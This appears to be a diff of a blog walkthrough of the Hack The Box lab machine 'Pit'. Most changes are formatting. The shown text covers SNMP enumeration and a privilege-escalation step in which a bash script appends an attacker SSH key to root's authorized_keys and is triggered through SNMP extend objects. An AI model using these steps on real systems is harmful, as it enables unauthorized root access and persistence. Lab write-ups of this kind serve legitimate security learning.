@@ -1,28 +1,30 @@
 ---
-date: 2021-09-25 12:00:00
-images: 
-- https://i.imgur.com/pUqq7fY.png
+title: 'Walktrough: HTB Pit'
 language: en-US
 localeid: htb-pit
+date: 2021-09-25T12:00:00.000Z
 tags:
-- HackTheBox
-- HTB Medium
-- HTB Linux
-- Walktrough
-title: 'Walktrough: HTB Pit'
-authors: ['default']
+  - HackTheBox
+  - HTB Medium
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/pUqq7fY.png'
+authors:
+  - default
 ---
 
 Hello guys!
 
 This week's machine will be **Pit**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [polarbearer](https://app.hackthebox.eu/users/159204) and [GibParadox](https://app.hackthebox.eu/users/125033).
 
-:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-[info]
+\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
+\[info]
 
 ![HTB Pit](https://i.imgur.com/pFwxqgv.png)
 
-This box was pretty different from the others as required some UDP enumeration, not often necessary but always useful when you're at a dead-end :smile:. SNMP was key to enumerating and privesc this box, which had greater complexity once had SELinux enabled and didn't allow an interactive shell until we get valid credentials to the system, connect via SSH and escalate privileges.
+This box was pretty different from the others as required some UDP enumeration, not often necessary but always useful when you're at a dead-end \:smile:. SNMP was key to enumerating and privesc this box, which had greater complexity once had SELinux enabled and didn't allow an interactive shell until we get valid credentials to the system, connect via SSH and escalate privileges.
 
 ## Enumeration
 
@@ -140,7 +142,7 @@ Accessing the pages, we can see, for `http://10.10.10.241:80` the default `nginx
 
 ![HTB Pit - Cockpit login page](https://i.imgur.com/ldyoAq7.png)
 
-Cockpit is a web-based administration interface for Linux Servers and, as the box's name is part of the name of this solution, we might be on the right path :smile: .
+Cockpit is a web-based administration interface for Linux Servers and, as the box's name is part of the name of this solution, we might be on the right path \:smile: .
 
 Checking for vulnerabilities for this product, I have found an SSRF vulnerability in version 234 in `searchsploit` that we may be able to use once it doesn't require any valid credentials.
 
@@ -185,13 +187,13 @@ for host in "${hosts[@]}"; do
 done
 ```
 
-Inspecting the results, found something interesting: when we call the domain `dms-pit.htb` we get a **403 Forbidden** response, the ideal scenario to leverage the SSRF vuln in Cockpit, if present :smile:
+Inspecting the results, found something interesting: when we call the domain `dms-pit.htb` we get a **403 Forbidden** response, the ideal scenario to leverage the SSRF vuln in Cockpit, if present \:smile:
 
 ```plaintext
 http://dms-pit.htb/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], Title[403 Forbidden], nginx[1.14.1]
 ```
 
-Making some tests based on the PoC Seen, noticed that the "Connect to" field mentioned isn't available. Also, checking the PoC videos, noticed that the version we're running is updated and no longer vulnerable, also confirmed issuing some requests to `/cockpit` and don't succeeding :disappointed:.
+Making some tests based on the PoC Seen, noticed that the "Connect to" field mentioned isn't available. Also, checking the PoC videos, noticed that the version we're running is updated and no longer vulnerable, also confirmed issuing some requests to `/cockpit` and don't succeeding \:disappointed:.
 
 Based on that, started to enumerate again, both running a `nmap` scan for all TCP ports and quick UDP scan as well, to check if we're missing something here. Also started a gobuster enumeration on `http://10.10.10.241` to check for any published website on it.
 
@@ -265,7 +267,7 @@ System uptime
  13:33:08 up 37 min,  0 users,  load average: 0.19, 0.10, 0.18
 ```
 
-Searching for other opportunities to enumerate SNMP devices, came across this page [SNMP:Comandos – snmpwalk – LRodrigo – Web Site (lncc.br)](https://lrodrigo.sgs.lncc.br/wp/dicas/smnpcomandos-disponiveis-no-linux/snmpcomandos-snmpwalk/) talking about some commands also using `snmpwalk`. The interesting here is that if you specify the OID until certain point, it lists all information about it, as SNMP works like a tree like the image below, extracted from Wikimedia.org:
+Searching for other opportunities to enumerate SNMP devices, came across this page [SNMP\:Comandos – snmpwalk – LRodrigo – Web Site (lncc.br)](https://lrodrigo.sgs.lncc.br/wp/dicas/smnpcomandos-disponiveis-no-linux/snmpcomandos-snmpwalk/) talking about some commands also using `snmpwalk`. The interesting here is that if you specify the OID until certain point, it lists all information about it, as SNMP works like a tree like the image below, extracted from Wikimedia.org:
 
 ![HTB Pit - SNMP Tree - source: wikimedia.org](https://i.imgur.com/Gb2LBgj.png)
 
@@ -440,21 +442,21 @@ According to this guide [SNMP RCE - HackTricks](https://book.hacktricks.xyz/pent
 
 Based on the gathered information, we probably have a way to gain `root`access, where the following steps were executed:
 
-- Created a `checkXXXX.sh` file, which adds a public key inside ssh's `authorized_keys` in the profile that runs the process and copied it to `/usr/bin/monitor`.
+* Created a `checkXXXX.sh` file, which adds a public key inside ssh's `authorized_keys` in the profile that runs the process and copied it to `/usr/bin/monitor`.
 
 ```bash
 #!/bin/bash
 echo "ssh-rsa <base64PubKey> root@kali" >> ~/.ssh/authorized_keys
 ```
 
-- From the attacker machine, triggered the nsExtendedObject action
+* From the attacker machine, triggered the nsExtendedObject action
 
 ```bash
 # Trigger Extended objects
 snmpwalk -v 1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
 ```
 
-- Right after that, connected using the corresponding private key via SSH as user `root`, where I was able to get the final flag
+* Right after that, connected using the corresponding private key via SSH as user `root`, where I was able to get the final flag
 
 ```bash
 $ ssh -i pit root@10.10.10.241
@@ -471,4 +473,4 @@ pit.htb
 
 I hope you guys have enjoyed!
 
-See you at the next post :smile:
+See you at the next post \:smile:
